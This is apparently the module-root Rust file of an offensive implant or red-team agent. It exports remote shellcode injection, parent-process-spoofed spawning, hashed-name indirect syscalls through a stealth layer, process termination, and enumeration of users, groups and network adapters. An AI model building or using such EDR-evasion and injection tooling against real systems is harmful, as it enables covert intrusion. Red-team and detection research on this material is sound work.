// Native helpers: process / memory / spawn / netinfo / users
// Windows: prefer indirect syscalls + PEB; other platforms: OS fallbacks.

#[cfg(all(windows, target_arch = "x86_64"))]
pub mod ghost_host;
/// Remote process shellcode inject — feature `inject` only (L2 mod_inject).
#[cfg(all(windows, feature = "inject"))]
pub mod inject;
#[cfg(windows)]
pub mod memory;
#[cfg(windows)]
pub mod process;
#[cfg(windows)]
pub mod spawn;

pub mod netinfo;
pub mod users;

#[cfg(all(windows, feature = "inject"))]
pub use inject::{inject_shellcode, wait_inject_thread, InjectResult};
#[cfg(windows)]
pub use memory::{nt_alloc_rw, nt_free};
#[cfg(windows)]
pub use process::{
    close_handle, create_thread_ex, find_pid_by_name, find_pids_by_name, kick_process_cache_refresh,
    list_processes, list_processes_bounded, open_process, open_process_by_name_for_ppid,
    process_cache_snapshot, terminate_process, terminate_process_handle, wait_for_single_object,
    wait_for_single_object_timeout, ProcessInfo, CURRENT_PROCESS, PROCESS_CREATE_PROCESS,
    PROCESS_TERMINATE,
};
#[cfg(windows)]
pub use spawn::{
    pipe_read_exact, pipe_read_to_end, pipe_read_to_end_bounded, pipe_write_all,
    spawn_piped_plain, spawn_spoofed_piped, spawn_spoofed_piped_result, spawn_spoofed_process,
    SpoofedPipedChild,
};

pub use netinfo::{format_adapters_text, list_adapters, AdapterInfo};
pub use users::{
    current_username, format_groups_text, format_users_text, list_local_groups, list_local_users,
    GroupInfo, UserInfo,
};

// Unix process helpers for hybrid shell builtins
#[cfg(not(windows))]
#[derive(Debug, Clone)]
pub struct ProcessInfo {
    pub pid: u32,
    pub ppid: u32,
    pub name: String,
}

#[cfg(not(windows))]
pub fn list_processes() -> Result<Vec<ProcessInfo>, String> {
    let mut list = Vec::new();
    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(pid_str) = path.file_name().and_then(|s| s.to_str()) {
                if pid_str.chars().all(|c| c.is_ascii_digit()) {
                    let name = std::fs::read_to_string(path.join("comm"))
                        .unwrap_or_else(|_| "?".into())
                        .trim()
                        .to_string();
                    let ppid = std::fs::read_to_string(path.join("status"))
                        .ok()
                        .and_then(|s| {
                            s.lines()
                                .find(|l| l.starts_with("PPid:"))
                                .and_then(|l| l.split_whitespace().nth(1))
                                .and_then(|x| x.parse().ok())
                        })
                        .unwrap_or(0);
                    list.push(ProcessInfo {
                        pid: pid_str.parse().unwrap_or(0),
                        ppid,
                        name,
                    });
                }
            }
        }
    }
    Ok(list)
}

#[cfg(not(windows))]
pub fn list_processes_bounded(_timeout: std::time::Duration) -> Result<Vec<ProcessInfo>, String> {
    list_processes()
}

#[cfg(not(windows))]
pub fn process_cache_snapshot() -> Vec<ProcessInfo> {
    list_processes().unwrap_or_default()
}

#[cfg(not(windows))]
pub fn kick_process_cache_refresh() {}

#[cfg(not(windows))]
pub fn terminate_process(pid: u32) -> Result<(), String> {
    let r = unsafe { libc::kill(pid as i32, 9) };
    if r == 0 {
        Ok(())
    } else {
        Err("kill failed".into())
    }
}

/// Invoke an ntdll export by name hash through the unified syscall layer.
#[macro_export]
macro_rules! syscall_nt {
    ($name:expr $(, $arg:expr)* $(,)?) => {{
        let __hash = $crate::stealth::hash_api_name($name);
        let __args: &[usize] = &[$($arg as usize),*];
        $crate::syscalls::indirect_syscall(__hash, __args)
    }};
}
